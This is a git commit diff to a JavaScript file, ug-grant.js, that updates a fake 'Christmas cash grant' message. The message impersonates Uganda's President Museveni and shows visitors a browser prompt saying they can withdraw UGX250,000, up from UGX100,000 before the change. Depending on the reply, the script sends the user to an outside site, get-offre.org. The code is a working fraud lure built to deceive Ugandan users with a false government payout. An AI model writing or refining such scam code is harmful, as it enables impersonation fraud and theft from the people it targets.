1a21027b6d4971ca68e7ff92d277403d09cf1ea6
trafficbank <153836234+trafficbank@users.noreply.github.com>
2024-12-20 22:50:11 -0800

    Update ug-grant.js

--- ug-grant.js
+++ ug-grant.js
@@ -1,6 +1,6 @@
 
-var password = 'WITHDRAW UGX100,000'
-password=prompt('SMS: Congratulations You are qualify for President YOWERI MUSEVENI UGX100,000 CHRISTMAS CASH GRANT FOR UGANDANS, Kindly Press OK to Withdraw Cash Prize   ','WITHDRAW UGX100,000');
-if (password != 'WITHDRAW UGX100,000') {
+var password = 'WITHDRAW UGX250,000'
+password=prompt('SMS: Congratulations You are qualify for President YOWERI MUSEVENI UGX250,000 CHRISTMAS ANF NEW YEAR CASH GRANT FOR UGANDANS, Kindly Press OK to Withdraw Cash Prize   ','WITHDRAW UGX250,000');
+if (password != 'WITHDRAW UGX250,000') {
 location.href='https://get-offre.org/uganda-exmas.html';
 }
